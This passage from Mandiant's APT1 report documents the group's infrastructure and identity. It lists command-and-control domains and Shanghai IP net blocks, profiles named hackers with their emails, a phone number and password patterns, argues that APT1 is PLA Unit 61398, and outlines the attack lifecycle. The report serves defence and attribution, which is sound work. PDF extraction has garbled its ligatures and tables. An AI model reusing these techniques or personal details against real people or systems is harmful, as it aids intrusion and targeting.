createdcometoway.org6 zones created6 zones createdusnftc.orgphoenixtvus.comushongkong.orgnewsesport.comyouipcam.comolmusic100.comtodayusa.orgbluecoate.com4 zones createdbigdepression.netarrowservice.netblackcake.netbusinessconsults.netinfosupports.comnewsonet.netpurpledaily.comavvmail.comshepmas.comsyscation.comtibethome.orgmicrosoft-update-info.combusketball.comcomrepair.netgmailboxes.comoplaymagzine.commaltempata.comnirvanaol.com7 zones createdcnndaily.commyyahoonews.comsatellitebbs.commsnhome.orgusabbs.orgns06.net6 zones createdcopporationnews.com7 zones creatednytimesnews.netcnnnewsdaily.comapplesoftupdate.com4 zones createdmicyuisyahooapis.cominfobusinessus.org200420052006200720082009201020112012 Mandiant APT1 46 www.mandiant.com The supplied registrant information does not need to be accurate for the zone to be registered successfully. For example, ﬁshanghaiﬂ is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the ˜rst known APT1 domain registration, along with a phone number that begins with China™s ﬁ+86ﬂ international code. In fact, Shanghai was listed as the registrant™s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency with which other cities appeared in APT1 zone registration information:TABLE 10: Locations supplied in registration data other than Shanghai, ChinaNumber City State Country7 Beijing - China5 Calgary Canada 4 Guizhou - China4 Pasadena CA US4 Houston TX US3 Sydney Australia3 Salt Lake UT US3 Washington, DC US2 Homewood AL US2 Kalkaska MI US2 Shallotte NC US2 Yellow Spring OH US2 New York NY US2 Provo UT US2 Shenzhen - China1 Birmingham AL US1 Scottsdale AZ US1 Sunnyvale CA US1 Albany NY US1 Pearl River NY US1 Chicago - US1 Moscow - Guatemala1 Nanning - China1 Wuhua - China27 Registration information blocked or not available Mandiant APT1 47 www.mandiant.com Some of the supplied registration information is obviously false. For example, consider the registration information supplied for the zone ﬁuszzcs.comﬂ in 2005: Victor etejedaa@yahoo.com +86.8005439436 Michael MurphyHere, a phone number with a Chinese pre˜x (ﬁ+86ﬂ) accompanied an address in the United States. Since the United States uses the pre˜x ﬁ+1ﬂ, it is highly unlikely that a person living in Ohio would provide a phone number beginning with ﬁ+86ﬂ. Additionally, the city name is spelled incorrectly, as it should be ﬁYellow Springsﬂ instead of ﬁYellow Springﬂ. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name incorrectly multiple times, both for the zones ﬁuszzcs.comﬂ and ﬁattnpower.comﬂ. This suggests that the registrant really thought ﬁYellow Springﬂ was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, Ohio. Overall, the combination of a relatively high number of ﬁShanghaiﬂ registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present, in which some registrants tried to fabricate non-Shanghai locations but others did not. This is supported by contextual information on the Internet for the email address ﬁlfengg@163.com,ﬂ which was supplied in the registration information for seven of the 107 zones. On the site ﬁwww.china-one.org,ﬂ the email address ﬁlfengg@163.comﬂ appears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company located in a part of Shanghai that is across the river from PLA Unit 61398. FIGURE 25: An email address used to register APT1 zones is also a contact for a Shanghai company Mandiant APT1 48 www.mandiant.com Naming ThemesAbout half of APT1™s known zones were named according to three themes: news, technology and business. These themes cause APT1 command and control addresses to appear benign at ˜rst glance. However, we believe that the hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not unique to APT1 or even APT in general.) The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters. However, they also include names referencing English-speaking countries, such as ﬁaunewsonline.comﬂ (Australia), ﬁcanadatvsite.comﬂ (Canada), and ﬁtodayusa.orgﬂ (U.S.). Below is a list of zones registered by APT1 that are news- themed:aoldaily.comaunewsonline.com canadatvsite.com canoedaily.com cnndaily.com cnndaily.net cnnnewsdaily.com mediaxsds.net myyahoonews.com newsesport.com newsonet.net newsonlinesite.com nytimesnews.net phoenixtvus.compurpledaily.com reutersnewsonline.com sportreadok.net usapappers.com usnewssite.com yahoodaily.comThe technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing topics like software:aolon1ine.com blackberrycluter.com bluecoate.com comrepair.net downloadsite.me idirectech.com livemymsn.com micyuisyahooapis.com pcclubddk.net symanteconline.net webservicesupdate.comFinally, some zones used by APT1 re˛ect a business theme. The names suggest websites that professionals might visit: advanbusiness.combusinessconsults.net copporationnews.com jobsadvanced.comNot every zone stays within APT1™s control forever. Over a campaign lasting for so many years, APT1 has not always renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, others have been transferred to the organizations that the domain names attempted to imitate. For example, in September 2011, Yahoo ˜led a complaint against ﬁzheng youjunﬂ of ﬁArizona, USAﬂ, who registered the APT1 zone ﬁmyyahoonews.comﬂ.37 Yahoo alleged the ﬁ<myyahoonews.com> domain name was confusingly similar to Complainant™s YAHOO! markﬂ and that ﬁzheng youjun registered and used the <myyahoonews.com> domain name in bad faith.ﬂ In response, the National Arbitration Forum found that the site ﬁmyyahoonews.comﬂ at the time resolved 37 Yahoo! Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http:// domains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013. Mandiant APT1 49 www.mandiant.com to ﬁa phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials under false pretenses.ﬂ Not surprisingly, ﬁzheng youjunﬂ did not respond. Subsequently, control of ﬁmyyahoonews. comﬂ was transferred from APT1 to Yahoo. Third-Party ServicesThe third-party service that APT1 has used the most is known as ﬁdynamic DNS.ﬂ This is a service that allows people to register subdomains under zones that other people have registered and provided to the service. Over the years, APT1 has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they simply log in to these services and update the IP resolution of their FQDN via a web-based interface.In addition to dynamic DNS, recently we have observed that APT1 has been creating FQDNs that end with ﬁappspot.comﬂ, suggesting that they are using Google™s App Engine service. Hijacked FQDNsAPT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We consider these domains to be ﬁhijackedﬂ because they were registered by someone for a legitimate reason, but have been leveraged by APT1 for malicious purposes. APT1 uses hijacked FQDNs for two main purposes. First, they place malware (usually in ZIP ˜les) on the legitimate websites hosted on the hop point and then send spear phishing emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their backdoors. EVIDENCE OF A VAST INFRASTRUCTUREAs noted above, we have con˜rmed the existence of 937 servers (listening applications) hosted on 849 distinct IP addresses, with the majority of IP addresses registered to organizations in China (709), followed by the U.S. (109). In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not ﬁsinkholeﬂ38 or ﬁdomain parkingﬂ39 IP addresses:»United States: 559»China: 263»Taiwan: 25 »Korea: 22»United Kingdom: 14»Canada: 12»Other: 8338 A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.39 Some IP addresses are used for ﬁdomain parkingﬂ once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when the zone expires. These IP addresses usually host advertisements. Mandiant APT1 50 www.mandiant.com The vast majority of the Chinese IP addresses again belong to APT1™s home networks, meaning that in some instances APT1 intruders probably communicated directly to victim systems from their Shanghai systems, bypassing their hop infrastructure:TABLE 11: APT1 FQDNs have resolved to IP addresses within these Chinese net blocks Number Net block Registered Owner150223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network 68 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 10 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 7114.80.0.0 - 114.95.255.255China Telecom Shanghai Network 5139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 4 222.64.0.0 - 222.73.255.25China Telecom Shanghai Network 3116.224.0.0 Œ 116.239.255.255China Telecom Shanghai Network 16Other (Non-Shanghai)These statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers, which are as-yet uncon˜rmed by Mandiant. Additionally, although we know of over 2,500 APT1 FQDNs, there are many APT1 FQDNs that we have not attributed to APT1, which have resolved to even more IP addresses. We estimate (conservatively) that APT1™s current hop infrastructure includes over 1,000 servers. Mandiant APT1 51 www.mandiant.com APT1: IDENTITIESAPT1 is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the PLA behind APT1™s keyboards, we have decided to expose the identities of a select number of APT1 personas. These actors have made poor operational security choices, facilitating our research and allowing us to track their activities. They are some of the authors of APT1™s digital weapons and the registrants of APT1 FQDNs and email accounts. These actors have expressed interest in China™s cyber warfare efforts, disclosed their locations to be the Pudong New Area of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns.Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture. Often this uni˜ed viewpoint reveals not only the group attribution, but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as ﬁpersonas.ﬂ As APT1 personas manage technical resources such as hops and Fully Quali˜ed Domain Names (FQDNs), they have been observed to de-con˛ict their actions amongst themselves by coordinating the use of speci˜c hops, FQDNs, CNO tools (e.g., malware) and ports.One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google. com, facebook.com, and twitter.com. Additionally, the nature of the hackers™ work requires them to have control of network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real identities.What is the Great Firewall of China?The ﬁGreat Firewallﬂ is a term used to describe the various technical methods used by the Chinese government to censor and block or restrict access to Internet services and content that the government considers sensitive or inappropriate. ﬁInappropriateﬂ content ranges from pornography to political dissent, and from social media to news sites that may portray China or Chinese of˜cials in a negative light. The ﬁGreat Firewallﬂ uses methods such as blocking particular IP addresses; blocking or redirecting speci˜c domain names; ˜ltering or blocking any URL containing target keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese websites, blogs, and social media for ﬁinappropriateﬂ content, removing it when found. As a result, Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption. China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks. Mandiant APT1 52 www.mandiant.com APT1 Hacker Pro˜le: Ugly Gorilla (Wang Dong/ )The story of ﬁUgly Gorillaﬂ (UG) dates back to 2004. A then-professor named Zhang Zhaozhong ( ), now a retired rear admiral, was in the process of helping to shape the future of China™s information warfare strategy. 40 Professor Zhang was already a strong advocate for the ﬁinformationizationﬂ of military units, and had published several works on military strategy including ﬁNetwork Warfareﬂ ( ) and ﬁWinning the Information Warﬂ ( ). As Director of the ﬁMilitary Technology and Equipmentﬂ () department at China™s National Defense University (), professor Zhang was invited to take part in an event titled ﬁOutlook 2004: The International Strategic Situationﬂ in January 2004.During the online question and answer session hosted by the PLA Daily™s ( ) China Military Online (), one young man with the nickname ﬁGreen˜eldﬂ () posed a particularly prescient question.ﬁProfessor Zhang, I read your book ™Network Warfare‚ and was deeply impressed by the views and arguments in the book. It is said that the U.S. military has set up a dedicated network force referred to as a ‚cyber army.™ Does China have a similar force? Does China have cyber troops?ﬂ Š UglyGorilla 16 Jan 2004Like all users of the China Military Online (chinamil) forums, ﬁGreen˜eldﬂ was required to sign up with an email address and specify a small bit of information about himself. Thankfully, the Internet™s tendency to immortalize data preserved the pro˜le details for us.40 http://www.chinamil.com.cn/site1/g˛t/2004-09/30/content_705216.htm FIGURE 26: Professor Zhang () 16 Jan 2004, source http://www.chinamil.com.cn/site1/g˚t/2004-09/30/ content_705216.htm Mandiant APT1 53 www.mandiant.com FIGURE 27: UglyGorilla chinamil pro˜le, source: http://bbs.chinamil.com.cn/forum/bbsui.jsp?id=(o)5681 Mandiant APT1 54 www.mandiant.com FIGURE 28: UglyGorilla chinamil pro˜le translated by translate.google.com/Thus, the persona we call ﬁUglyGorillaﬂ (UG) was ˜rst documented. In addition to his email address, UG listed his ﬁreal nameﬂ as ﬁJackWangﬂ. Within the year, we saw the ˜rst evidence of UG honing the tools of his trade. On October 25, 2004, UG registered the now infamous ﬁhugesoft.orgﬂ zone. The ﬁhugesoft.orgﬂ zone and its many APT1-attributed hostnames have remained active and under the continuous ownership of UG, and are still active as of the time of this report. Registration information was most recently updated on September 10, 2012, extending the registration period for the zone well into 2013. We may see UG relinquish this and other attributed zones as a result of this reporting, in an effort to deter further tracking and attribution.In 2007, UG authored the ˜rst known sample of the MANITSME family of malware and, like a good artist, left his clearly identi˜able signature in the code: ﬁv1.0 No Doubt to Hack You, Writed by UglyGorilla, 06/29/2007ﬂsic. UG™s tendency to sign his work is present in the strings he chooses for hostnames and even within the communications protocols his backdoors use. For example, What is a meat chicken?!? Chinese Hacker Slang: ﬁroujiﬂ () Š Meat Chicken n. Š An infected computerExample strings from MANITSME samples: ﬁd:\\\\My Documents\\\\Visual Studio Projects\\\\rouji\\\\SvcMain.pdbﬂExamples from other malware– ﬁconnecting to roujiﬂ ﬁwelcome to ***(rouji)ﬂ Mandiant APT1 55 www.mandiant.com hostnames within other APT1-attributed FQDNs such as ﬁarrowservice.netﬂ and even the newer ﬁmsnhome.orgﬂ continue to leave UG™s imprint (note the ﬁugﬂ in the domains): »ug-opm.hugesoft.org»ug-rj.arrowservice.net»ug-hst.msnhome.orgThough these kinds of obvious attribution links tapered off as UG became more experienced, the protocol signatures of his tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai.UG™s consistent use of the username ﬁUglyGorillaﬂ across various Web accounts has left a thin but strong thread of attribution through many online communities. In most instances, content such as hacking tools, information security topics, and association with the Shanghai locality are reasonable ways to eliminate false positives. For example, in February of 2011, the disclosure of all registered ﬁrootkit.comﬂ accounts published by Anonymous included the user ﬁuglygorillaﬂ with the registered email address uglygorilla@163.com. This is the same email used to register for the 2004 PLA forum and the zone hugesoft.org. Included in the rootkit.com leaked account information was the IP address 58.246.255.28, which was used to register UG™s account directly from the previously discussed APT1 home range: 58.246.0.0/15.In a few of these accounts, UG has listed something other than ﬁJackWangﬂ as his real name. On February 2, 2006, a user named ﬁuglygorillaﬂ uploaded a ˜le named ﬁmailbomb_1.08.zipﬂ (a bulk email tool) to the Chinese developer site PUDN (www.pudn.com). His account details from PUDN included the real name ﬁWang Dongﬂ ( ).FIGURE 29: Wang Dong™s Uploaded Files to pudn.comIt is important to note two things at this point. First, Chinese names begin with the surname. So ﬁWangﬂ is the last name in . Second, it is a fairly common practice for the Chinese, even in China, to choose an English ˜rst name. Thus ﬁJackWangﬂ may not have been an alias at all. Mandiant APT1 56 www.mandiant.com APT1 Hacker Pro˜le: DOTA Another APT1 persona is ﬁdotaﬂ (DOTA), named for his strong tendency to use variants of that name in almost all accounts he creates and uses from his attack infrastructure. DOTA may have taken his name from the video game ﬁDefense of the Ancientsﬂ which is commonly abbreviated DotA, though we have yet to observe any direct link or other direct reference to the game.We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com, and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web- based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services. For example, DOTA (originating from the APT1 home range IP address 58.247.26.59) with a Simpli˜ed Chinese keyboard setting used the email address ﬁd0ta001@hotmail.comﬂ from his US hop to register the Facebook user ﬁdo.ta.5011ﬂ(Facebook user id: 100002184628208).Some services, such as Google™s Gmail, require users to provide a phone number during the registration process to which they send a validation ﬁtext messageﬂ containing a veri˜cation code. The user must then input the veri˜cation code on the website to ˜nalize registration. In an observed session on a compromised machine, DOTA used the phone number ﬁ159-2193-7229ﬂ to receive a veri˜cation text message from Google, which he then submitted to their page within seconds. Telephone numbers in China are organized into a hierarchy containing an area code, pre˜x, and line number similar to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone providers. The phone number ﬁ159-2193-7229ﬂ breaks down into the ﬁ159ﬂ area code, which indicates a mobile phone provided by China Mobile, and the pre˜x ﬁ2193ﬂ, which indicates a Shanghai mobile number. This means at the very least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA™s response also indicates that he had the phone with him at the time.We have also observed DOTA using the names Rodney and Raith to communicate via email in ˛uent English with various targets including South East Asian military organizations in Malaysia and the Philippines. It is unclear if this Gmail account is used exclusively for facilitating his CNO mission, but much of the traf˜c indicates its use in both simple phishing attacks, as well as more sophisticated email based social engineering.DOTA : a Harry ﬁPoterﬂ fan?The DOTA persona also appears to be a fan of the popular ﬁHarry Potterﬂ character, frequently setting accounts ﬁsecurity questionsﬂ such as ﬁWho is your favorite teacher?ﬂ and ﬁWho is your best childhood friend?ﬂ to the values ﬁHarryﬂ and ﬁPoterﬂ and creating accounts such as poter.spo1@gmail. com with the alternate email address set to dota.sb005@gmail.com. Mandiant APT1 57 www.mandiant.com FIGURE 30: dota.d001@gmail.com (inbox view)41When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management becomes a signi˜cant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based, such as the keyboard pattern ﬁ1qaz2wsxﬂ or highly memorable, using ﬁrootkitﬂ as a password on the information security research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as passwords such as ﬁ1qaz@WSX#EDCﬂ. However, there is one password ﬁ2j3c1kﬂ extensively used by DOTA that is not based on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered ﬁjﬂ, followed by a numbered ﬁcﬂ, and then a numbered ﬁkﬂ is likely shorthand (ﬁjﬂ/ﬂcﬂ/ﬂkﬂ) for the ju/chu/ke () organizational structure (translated to Bureau/Division (or Of˜ce)/Section) widely used within PLA General Staff Department organizations. Project 2049 describes the typical PLA organizational structure as, ﬁBureau-level directors – oversee between six and 14 subordinate sites or of˜ces chu; – Sites/of˜ces under bureaus are further divided into sections 41 This is a screen capture of DOTA accessing his Gmail account while using a compromised system on APT1™s attack infrastructure. Mandiant APT1 58 www.mandiant.com ke; .42 Given this pattern, it is likely that the password ﬁ2j3c1kﬂ stands for 2nd Bureau Unit 61398, 3rd Division, 1st Section, demonstrating that those who use these patterns are working together and af˜liate themselves to the 2nd Bureau.Attempting to track the DOTA persona back to a particular individual is dif˜cult; the trail of his activity does not link as clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA. Speci˜cally, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together. APT1 Hacker Pro˜le: SuperHard (Mei Qiang/)The third and ˜nal persona we are revealing has been dubbed ﬁSuperHardﬂ (SH). SH was ˜rst observed as a tool author, and is either the creator or a signi˜cant contributor to the AURIGA and BANGAT malware families (covered in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the tools. In particular, elements of the portable executable (PE) ˜le™s VS_VERSIONINFO structure are frequently set to ﬁSuperHard,ﬂ or cmd.exe copies are modi˜ed from ﬁMicrosoft corp.ﬂ to ﬁsuperhard corp.ﬂAdditionally, many of SH™s tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH™s tools are observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH™s tools are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is primarily involved in research and development for APT1.Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.com account ﬁSuperHard_Mﬂ was originally registered from the IP address 58.247.237.4, within one of the known APT1 egress ranges, and using the email address ﬁmei_qiang_82@sohu.comﬂ. We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name ﬁMei Qiangﬂ () is a reasonably common Chinese last/˜rst name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several ﬁMei Qiangﬂ identities online that claim a birth year of 1982, making attribution to an individual dif˜cult.Fortunately, we can use SH™s email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH™s link to the ﬁmei_qiang_82@sohu.comﬂ43 email address and APT1 af˜liation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by ﬁgreen˜eldﬂ, possibly UG), and more recently, being local to Shanghai™s Pudong New Area. 4442 Mark A. Stokes, Jenny Lin, and L.C. Russell Hsiao, ﬁThe Chinese People™s Liberation Army Signals Intelligence and Cyber Reconnaissance Infrastructure,ﬂ Project 2049 Institute (2011): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, accessed February 6, 2013.43 Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of Beijing China.44 hxxp://tuziw.com/index.php?m=ta&id=1864863532 Mandiant APT1 59 www.mandiant.com CONCLUSIONIn a State that rigorously monitors Internet use, it is highly unlikely that the Chinese Government is unaware of an attack group that operates from the Pudong New Area of Shanghai. The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398.TABLE 12: Matching characteristics between APT1 and Unit 61398CharacteristicAPT1 (as directly observed)Unit 61398 (as reported)Mission area»Steals intellectual property from English-speaking organizations»Targets strategic emerging industries identi˜ed in China™s 12th Five Year Plan »Conducts computer network operations against English-speaking targetsTools, Tactics, and Procedures (TTPs)»Organized, funded, disciplined operators with speci˜c targeting objectives and a code of ethics (e.g., we have not witnessed APT1 destroy property or steal money which contrasts most ﬁhackersﬂ and even the most sophisticated organize crime syndicates)»Conducts military-grade computer network operationsScale of operations»Continuously stealing hundreds of terabytes from 141 organizations since at least 2006; simultaneously targeting victims across at least 20 major industries»Size of ﬁhopﬂ infrastructure and continuous malware updates suggest at least dozens (but probably hundreds) of operators with hundreds of support personnel »As part of the PLA, has the resources (people, money, in˛uence) necessary to orchestrate operation at APT1™s scale »Has hundreds, perhaps thousands of people, as suggested by the size for their facilities and position within the PLA Mandiant APT1 60 www.mandiant.com CharacteristicAPT1 (as directly observed)Unit 61398 (as reported)Expertise of personnel»English language pro˜ciency»Malware authoring»Computer hacking»Ability to identify data worth stealing in 20 industries»English language requirements»Operating system internals, digital signal processing, steganography»Recruiting from Chinese technology universitiesLocation»APT1 actor used a Shanghai phone number to register email accounts»Two of four ﬁhomeﬂ Shanghai net blocks are assigned to the Pudong New Area»Systems used by APT1 intruders have Simpli˜ed Chinese language settings»An APT1 persona™s self-identi˜ed location is the Pudong New Area»Headquarters and other facilities spread throughout the Pudong New Area of Shanghai, ChinaInfrastructure»Ready access to four main net blocks in Shanghai, hosted by China Unicom (one of two Tier 1 ISPs in China) »Some use of China Telecom IP addresses (the other Tier 1 ISP) »Co-building network infrastructure with China Telecom in the name of national defenseCombining our direct observations with carefully researched and correlated ˜ndings; we believe the facts dictate only two possibilities:EitherA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398™s gates, performing tasks similar to Unit 61398™s known mission. OrAPT1 is Unit 61398. Mandiant APT1 61 www.mandiant.com APPENDIX A: HOW DOES MANDIANT DISTINGUISH THREAT GROU PS?Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is ultimately de˜ned by people and not by methodology. However, de˜ning a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting behind the keyboard it may be dif˜cult to determine whether two different intrusion events were conducted by the same person, by two people who are working together, by two unrelated people who independently compromised the same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise the same target.Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:»The method the thief used to break in;»The tools used to open the safe;»Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to grab something of value;»Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as ˜ngerprints; or whether he was not very careful, but simply relied on being ﬁstealthy enoughﬂ to not get caught. Mandiant APT1 62 www.mandiant.com Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another. In a similar way, cyber intruders leave behind various digital ﬁ˜ngerprints.ﬂ They may send spear-phishing emails from a speci˜c IP address or email address. Their emails may contain certain patterns of subject lines. Their ˜les have speci˜c names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another. Digital ﬁ˜ngerprintsﬂ do not all carry equal weight in attribution analysis. Their validity or value as indicators of a speci˜c threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as HTRAN is not unique and not useful Š by itself Š as an indicator of a speci˜c threat group. In contrast, the use of a speci˜c, custom backdoor not observed elsewhere is a much stronger indicator Š although it is generally still not suf˜cient, on its own, for positive attribution.At the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same person or group of people were involved. Mandiant APT1 63 www.mandiant.com APPENDIX B: APT AND THE ATTA CK LIFECYCLEWhile most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages of Mandiant™s Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages between ﬁEstablish Footholdﬂ and ﬁComplete Missionﬂ do not have to occur in this order every time. In fact, once established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying data of interest, moving laterally to access that data, and ﬁcompleting missionﬂ by stealing the data. This will generally continue inde˜nitely until they are removed entirely from the network. Initial CompromiseThe Initial Compromise stage represents the methods that intruders use to penetrate a target organization™s network. APT intruders frequently target individual users within a victim environment. As such, the most commonly observed method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to a malicious ˜le, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer is vulnerable to the attacker™s exploit code. APT groups may also look for vulnerable Internet-facing web servers and upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in public-facing infrastructure.Establish FootholdEstablishing a foothold ensures that APT threat groups can access and control one or more computers within the victim organization from outside the network. APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are common examples), ﬁundergroundﬂ backdoors found in hacker websites or obtained through personal connections, and ﬁcustomﬂ backdoors that they developed themselves. These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give the APT groups basic access to a system, typically through a command shell or graphical user interface. Mandiant APT1 64 www.mandiant.com Escalate PrivilegesEscalating privileges involves acquiring items that will allow access to more resources within the victim environment. Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI certi˜cates, VPN client software, privileged computers, or other resources required to access data or systems of interest. APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user accounts. This is typically accomplished by ˜rst ﬁdumpingﬂ password hashes from a computer, server, or (preferably) Domain Controller. The attacker may be able to obtain legitimate account passwords by ﬁcrackingﬂ password hashes. Alternately, the attacker may leverage the hashes themselves in a ﬁpass-the-hashﬂ attack, where the hashed password itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily leveraged for both password dumping and pass-the-hash attacks.Internal ReconnaissanceIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. APT threat actors use built-in operating system commands (such as the Windows ﬁnetﬂ commands) to obtain information about the internal network, including computers, trust relationships, users, and groups. In order to identify data of interest, they may perform directory or network share listings, or search for data by ˜le extension, key word, or last modi˜ed date. Data of interest may take many forms, but most commonly consists of documents, the contents of user email accounts, or databases. Therefore ˜le servers, email servers, and domain controllers are customary targets of internal reconnaissance. Some APT groups utilize custom scripts in order to automate the process of reconnaissance and identi˜cation of data of interest. Move LaterallyIn most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore they must move laterally within a network to other computers that either contain that data or allow them to access it. APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and devices inside of a victim network. They commonly use compromised credentials with PsExec and / or the Windows Task Scheduler (ﬁatﬂ command) to execute commands and install malware on remote systems. Maintain PresenceIn this stage, the intruders take actions to ensure continued control over key systems in the network environment from outside of the network. APT groups often install new backdoors (e.g., different backdoors than the ones installed in the Establish Foothold phase) in the environment during the course of the campaign. They may install different families of malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and to make it dif˜cult to identify and remove all of their access points. Additionally, APT groups may establish methods of network access that do not involve backdoors, so that they can maintain a presence even if network security personnel discover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some instances APT threat actors have been able to circumvent 